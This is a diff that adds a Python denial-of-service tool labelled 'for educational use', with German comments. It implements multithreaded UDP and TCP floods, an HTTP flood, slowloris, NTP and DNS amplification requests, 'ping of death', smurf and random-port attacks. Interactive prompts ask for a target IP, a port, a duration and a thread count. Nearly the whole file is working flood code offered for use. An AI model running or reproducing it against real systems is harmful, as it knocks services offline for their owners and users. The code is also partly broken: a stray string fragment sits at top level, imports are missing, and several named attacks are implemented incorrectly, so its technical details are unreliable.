@@ -1,0 +1,148 @@
+COLORS = {
+    "menu": "pink",
+    "info": "cyan",
+    "success": "green",
+    "error": "red"
+}
+
+#Menü
+
+    """, COLORS["error"]))
+    print(colored("*******************************************", COLORS["menu"]))
+
+    print(colored("*      DDoS Attack Tool multiple Options  *", COLORS["menu"]))
+    print(colored("*         Created for Educational Use     *", COLORS["menu"]))
+
+    print(colored("*******************************************", COLORS["menu"]))
+    print(colored("Author: Beoky", COLORS["success"]))
+    print(colored("Usage of this tool must comply with all laws.", COLORS["info"]))
+    print(colored("WARNING: Unauthorized use of this tool is illegal.", COLORS["error"]))
+    print()
+
+# Attack Options
+
+def execute_attack(ip, port, duration, threads, attack_type, payload=None):
+    stats = {"packets_sent": 0}
+    lock = threading.Lock()
+
+    def attack():
+        nonlocal stats
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM if attack_type == "udp" else socket.SOCK_STREAM) as sock:
+                    sock.sendto(payload or random._urandom(1024), (ip, port))
+                    with lock:
+                        stats["packets_sent"] += 1
+            except:
+                continue
+
+    threads_list = [threading.Thread(target=attack) for _ in range(threads)]
+    for t in threads_list:
+        t.start()
+    for t in threads_list:
+        t.join()
+
+    print(colored(f"{attack_type.upper()} attack completed. Packets sent: {stats['packets_sent']}", COLORS["success"]))
+
+#More
+
+def apdos_attack(ip, port, duration, threads):
+    payload = random._urandom(1024)  # Beispiel-Payload
+    execute_attack(ip, port, duration, threads, "apdos", payload)
+
+def ntp_amplification(ip, duration, threads):
+    ntp_request = b"\x17\x00\x03\x2a" + b"\x00" * 4
+    execute_attack(ip, 123, duration, threads, "ntp", ntp_request)
+
+def chargen_attack(ip, port, duration, threads):
+    payload = b"CharGEN Test Payload"
+    execute_attack(ip, port, duration, threads, "chargen", payload)
+
+def http_flood(ip, port, duration, threads, rps):
+    def attack():
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((ip, port))
+                request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode()
+                for _ in range(rps):
+                    sock.send(request)
+                sock.close()
+            except:
+                pass
+
+    threads_list = [threading.Thread(target=attack) for _ in range(threads)]
+    for t in threads_list:
+        t.start()
+    for t in threads_list:
+        t.join()
+    print(colored("HTTP Flood attack completed.", COLORS["success"]))
+
+def slowloris_attack(ip, port, duration, threads):
+    def attack():
+        timeout = time.time() + duration
+        while time.time() < timeout:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.connect((ip, port))
+                sock.send(b"GET / HTTP/1.1\r\n")
+                time.sleep(10)  # Halte Verbindung offen
+            except:
+                pass
+
+    threads_list = [threading.Thread(target=attack) for _ in range(threads)]
+    for t in threads_list:
+        t.start()
+    for t in threads_list:
+        t.join()
+    print(colored("Slowloris attack completed.", COLORS["success"]))
+
+def pod_attack(ip, duration, threads):
+    payload = b"\xff" * 65507  # Maximal erlaubte UDP-Paketgröße
+    execute_attack(ip, 0, duration, threads, "pod", payload)
+
+def smurf_attack(broadcast_ip, duration, threads):
+    payload = b"\x08\x00" + random._urandom(32)  # ICMP-Echo (typischer Payload)
+    execute_attack(broadcast_ip, 0, duration, threads, "smurf", payload)
+
+# More "2"
+def tsunami_attack(ip, port, duration, threads):
+    execute_attack(ip, port, duration, threads, "tsunami")
+
+def dns_amplification_attack(ip, duration, threads):
+    dns_query = (b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
+                 b"\x07example\x03com\x00\x00\x01\x00\x01")
+    execute_attack(ip, 53, duration, threads, "dns_amplification", dns_query)
+
+def custom_payload_attack(ip, port, duration, threads, payload_path):
+    try:
+        with open(payload_path, "rb") as f:
+            payload = f.read()
+    except Exception as e:
+        print(colored(f"Error loading payload: {e}", COLORS["error"]))
+        return
+    execute_attack(ip, port, duration, threads, "custom_payload", payload)
+
+def mitigation_check(ip, port):
+    print(colored(f"Checking mitigation on {ip}:{port}...", COLORS["menu"]))
+    # Hier könnte ein Testimplementierung hinzugefügt werden
+    print(colored("Mitigation check completed.", COLORS["success"]))
+
+def randomized_multi_port_attack(ip, duration, threads):
+    ports = [random.randint(1, 65535) for _ in range(threads)]
+    print(colored(f"Attacking random ports on {ip}...", COLORS["menu"]))
+    for port in ports:
+        execute_attack(ip, port, duration, 1, "random_ports")
+
+# Zielinformationen abfragen
+def get_target_info():
+    ip = input(colored("Enter target IP: ", COLORS["info"]))
+    port = int(input(colored("Enter target port (0 if not applicable): ", COLORS["info"])))
+    duration = int(input(colored("Enter attack duration (seconds): ", COLORS["info"])))
+    return ip, port, duration
+
+def get_threads():
+    threads = int(input(colored("Enter number of threads (Max: 100): ", COLORS["info"])))
+    return min(threads, 100)
